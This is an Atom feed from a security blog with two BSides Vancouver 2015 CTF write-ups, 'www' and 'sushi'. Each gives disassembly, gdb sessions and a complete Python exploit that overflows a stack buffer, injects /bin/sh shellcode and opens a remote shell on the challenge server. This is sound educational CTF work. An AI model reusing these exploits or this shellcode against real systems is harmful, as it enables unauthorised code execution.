@@ -1,0 +1,275 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: Bsides | staring into /dev/null]]></title>
+  <link href="http://barrebas.github.io/blog/categories/bsides/atom.xml" rel="self"/>
+  <link href="http://barrebas.github.io/"/>
+  <updated>2015-03-18T20:55:20+01:00</updated>
+  <id>http://barrebas.github.io/</id>
+  <author>
+    <name><![CDATA[barrebas]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[BSides Vancouver CTF - WWW]]></title>
+    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www/"/>
+    <updated>2015-03-18T20:36:56+01:00</updated>
+    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-www</id>
+    <content type="html"><![CDATA[<p>After solving <code>sushi</code>, there were plenty of pwnables left to choose from. Next up was <code>www</code>!</p>
+
+<!-- more -->
+
+
+<p><code>www</code> was a 200 point challenge and consisted of a 32-bit Linux binary. After dealing with <code>sushi</code>, I decided to inspect the binary in <code>gdb-peda</code> right away:</p>
+
+<pre><code class="bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+
+<p>Again, no protections in place. Running the binary reveals what it is trying to do:</p>
+
+<pre><code class="bash">gdb-peda$ r
+Welcome to www! Please give me two strings to have them echoed back to you!
+buffers at 0xffffd4c4 and 0xffffd3c4, ready for input!
+AAAAAA
+BBBBBB
+AAAAAA
+
+BBBBBB
+
+Stack canary created: &gt;tC[hbw]
+Better luck next time, eh?
+</code></pre>
+
+<p>Looks like it has two buffers on the stack and a custom stack canary implementation. The vulnerable function is called <code>copybuf</code>:</p>
+
+<pre><code>0804873c &lt;copybuf&gt;:
+ 804873c:   55                      push   ebp
+ 804873d:   89 e5                   mov    ebp,esp
+ 804873f:   83 ec 38                sub    esp,0x38
+ 8048742:   c7 44 24 08 09 00 00    mov    DWORD PTR [esp+0x8],0x9
+ 8048749:   00 
+ 804874a:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
+ 8048751:   08 
+ 8048752:   8d 45 eb                lea    eax,[ebp-0x15]
+ 8048755:   89 04 24                mov    DWORD PTR [esp],eax
+ 8048758:   e8 c3 fe ff ff          call   8048620 &lt;strncpy@plt&gt;
+ 804875d:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]
+ 8048760:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax
+ 8048764:   8d 45 db                lea    eax,[ebp-0x25]                ; first buffer is copied here
+ 8048767:   89 04 24                mov    DWORD PTR [esp],eax
+ 804876a:   e8 41 fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
+ 804876f:   8b 45 0c                mov    eax,DWORD PTR [ebp+0xc]       ; ebp+0xc = second input
+ 8048772:   89 44 24 04             mov    DWORD PTR [esp+0x4],eax          
+ 8048776:   8b 45 08                mov    eax,DWORD PTR [ebp+0x8]       ; overflow this pointer with exit@got
+ 8048779:   89 04 24                mov    DWORD PTR [esp],eax
+ 804877c:   e8 2f fe ff ff          call   80485b0 &lt;strcpy@plt&gt;
+ ; check_cookie:
+ 8048781:   c7 44 24 04 68 9d 04    mov    DWORD PTR [esp+0x4],0x8049d68 ; canary
+ 8048788:   08 
+ 8048789:   8d 45 eb                lea    eax,[ebp-0x15]
+ 804878c:   89 04 24                mov    DWORD PTR [esp],eax
+ 804878f:   e8 bc fd ff ff          call   8048550 &lt;strcmp@plt&gt;
+ 8048794:   89 45 f4                mov    DWORD PTR [ebp-0xc],eax
+ 8048797:   83 7d f4 00             cmp    DWORD PTR [ebp-0xc],0x0
+ 804879b:   74 18                   je     80487b5 &lt;copybuf+0x79&gt;        ; if canary check fails, call exit@plt -&gt; overwrite
+ 804879d:   c7 04 24 30 8a 04 08    mov    DWORD PTR [esp],0x8048a30
+ 80487a4:   e8 17 fe ff ff          call   80485c0 &lt;puts@plt&gt;
+ 80487a9:   c7 04 24 00 00 00 00    mov    DWORD PTR [esp],0x0
+ 80487b0:   e8 2b fe ff ff          call   80485e0 &lt;exit@plt&gt;
+ ; cookie_OK:
+ 80487b5:   c9                      leave  
+ 80487b6:   c3                      ret    
+</code></pre>
+
+<p>In short, the program takes two inputs and uses <code>strcpy()</code> to copy these to the stack. However, the saved return address on the stack is protected from overwriting by a custom stack canary. The way around is to exploit the buffer overflow to overwrite on of the arguments to the second <code>strcpy()</code>: the pointer to the second buffer. If we control that pointer, we basically have a write-what-where. I choose to overflow the pointer to the second buffer with the address of <code>exit@plt</code>. This way, after overwriting the stack canary, the program will try to exit, but <code>exit@plt</code> will point to attacker-controlled shellcode on the stack.</p>
+
+<p>Putting it all together:</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib, re
+
+def p(x):
+    return struct.pack('&lt;L', x)
+
+def pQ(x):
+    return struct.pack('&lt;Q', x)
+
+s=socket(AF_INET, SOCK_STREAM)
+#s.connect(('localhost', 17284))
+s.connect(('www.termsec.net', 17284))
+
+buf = s.recv(200)
+
+m = re.findall('(0x[0-9a-f]+)', buf)
+buf1_addr = int(m[0], 16)
+buf2_addr = int(m[1], 16)
+
+print "[~] buf1: 0x%lx" % buf1_addr
+print "[~] buf2: 0x%lx" % buf2_addr
+
+# first input will overwrite the pointer that is used for the second strcpy 
+payload = ""
+payload += "A"*45       # padding
+payload += p(0x8049d10) # we'll overwrite exit@plt
+payload += p(buf2_addr) # restore this on the stack, otherwise it will be partially overwritten
+
+s.send(payload + "\n")
+
+# second input, used in second strcpy. By now, that strcpy will call:
+# strcpy(0x8049d10, buffer2)
+payload = ""
+payload += p(buf2_addr+4)   # overwrite exit@plt with the address where the shellcode starts
+payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x8d\x54\x24\x08\x50\x53\x8d\x0c\x24\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
+
+s.send(payload + "\n")
+s.recv(200)
+
+print "[!] enjoy your shell"
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+s.close()
+</code></pre>
+
+<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/www-200$ python ./www.py
+[~] buf1: 0xbfa660d4
+[~] buf2: 0xbfa65fd4
+
+[!] enjoy your shell
+id
+/bin//sh: 1: id: not found
+cat flag.txt
+flag{K33P_ST4T1C_L1K3_W00L_F4BR1C}
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[BSides Vancouver CTF - Sushi]]></title>
+    <link href="http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi/"/>
+    <updated>2015-03-18T20:15:54+01:00</updated>
+    <id>http://barrebas.github.io/blog/2015/03/18/bsides-vancouver-ctf-sushi</id>
+    <content type="html"><![CDATA[<p>At the very last minute, we decided to join BSides Vancouvers&#8217; CTF. Sushi was a 100 point pwnable.</p>
+
+<!-- more -->
+
+
+<p>We&rsquo;re given the binary (and the libraries are available if need be &ndash; really nice, no guessing). Upon running it, it gives us some address and asks for money:</p>
+
+<pre><code class="bash">Deposit money for sushi here: 0x7ffc068ccfe0
+aaaaaaaa
+Sorry, $0.97 is not enough.
+</code></pre>
+
+<p>It seems to take the first character <code>a</code> (0x61 or 97) and use that. After fruitlessly trying to trigger a format string vulnerability, I disassembled the binary and checked out it in <code>gdb-peda</code>.</p>
+
+<pre><code class="bash">gdb-peda$ checksec
+CANARY    : disabled
+FORTIFY   : disabled
+NX        : disabled
+PIE       : disabled
+RELRO     : disabled
+</code></pre>
+
+<p>Okay, no protections whatsoever. This means that the stack is executable too. The idea of string format vulnerability was quickly replaced with a good old buffer overflow:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "".join(["%04d" % x for x in range(200)])' | ./sushi
+Deposit money for sushi here: 0x7ffd0aa1edb0
+Sorry, $0.48 is not enough.
+Segmentation fault (core dumped)
+bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
+...snip...
+Core was generated by `./sushi'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x00000000004005f2 in ?? ()
+gdb-peda$ x/i $rip
+=&gt; 0x4005f2:    ret    
+gdb-peda$ x/2wx $rsp
+0x7ffd0aa1edf8: 0x38313030  0x39313030
+</code></pre>
+
+<p>Upon supplying a large buffer, the program crashes. Apparently, the saved return address is overwritten with <code>00180019</code>, so now I had the offset. The program crashes upon executing the <code>ret</code> statement at <code>0x4005f2</code> because the address does not point to a valid memory location.</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python -c 'print "A"*(18*4)+"BBBBCCCC"' | ./sushi
+Deposit money for sushi here: 0x7ffdcfd360b0
+Sorry, $0.65 is not enough.
+Segmentation fault (core dumped)
+bas@tritonal:~/tmp/yvrctf/sushi-100$ gdb ./sushi core
+...snip...
+Core was generated by `./sushi'.
+Program terminated with signal 11, Segmentation fault.
+#0  0x00000000004005f2 in ?? ()
+gdb-peda$ x/2wx $rsp
+0x7ffdcfd360f8: 0x42424242  0x43434343
+gdb-peda$ x/s 0x7ffdcfd360b0
+0x7ffdcfd360b0:  'A' &lt;repeats 72 times&gt;, "BBBBCCCC"
+</code></pre>
+
+<p>What&rsquo;s more, each time upon running <code>sushi</code>, the program supplies the address of the buffer it is using! In other words, that&rsquo;s a nice place for shellcode!</p>
+
+<p>The program uses <code>gets()</code> to get the input:</p>
+
+<pre><code class="bash">0x4005c5:  call  0x400480 &lt;gets@plt&gt;
+</code></pre>
+
+<p>This means that we can send null bytes, which we need to overwrite the saved return address with the address of our buffer. These things together (and the fact that the vulnerable binary is ran on a remote box) meant that it had to be run from a <code>socat</code> process:</p>
+
+<pre><code class="bash">$ socat TCP-LISTEN:4000,fork,reuseaddr EXEC:./sushi
+</code></pre>
+
+<p>Next was writing a simple exploit in python:</p>
+
+<pre><code class="python">from socket import *
+import struct, telnetlib, re
+
+def p(x):
+    return struct.pack('&lt;L', x)
+
+def pQ(x):
+    return struct.pack('&lt;Q', x)
+
+s=socket(AF_INET, SOCK_STREAM)
+#s.connect(('localhost', 4000))
+s.connect(('sushi.termsec.net', 4000))
+
+buf = s.recv(1000)
+stack_addr = int(re.search('(0x[0-9a-f]+)', buf).group(1), 16)
+
+print "[~] stack addr: 0x%lx" % stack_addr
+
+# simple x64 execve shellcode
+shellcode = "\x31\xc0\48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
+# payload must overflow saved return address on stack
+payload = shellcode + "A" * (72 - len(shellcode))
+# we're given the address of our (executable!) buffer on the stack, so use that as return address
+payload += pQ(stack_addr) + "\n"
+
+s.send(payload)
+
+t = telnetlib.Telnet()
+t.sock = s
+t.interact()
+s.close()
+</code></pre>
+
+<p>It ran locally after a bit of fine-tuning, so the proof was in the pudding:</p>
+
+<pre><code class="bash">bas@tritonal:~/tmp/yvrctf/sushi-100$ python ./sushi.py 
+[~] stack addr: 0x7fffb3fc0480
+Sorry, $0.49 is not enough.
+cat flag.txt
+flag{I_l3ft_my_wallet_in_#irc}
+</code></pre>
+]]></content>
+  </entry>
+  
+</feed>
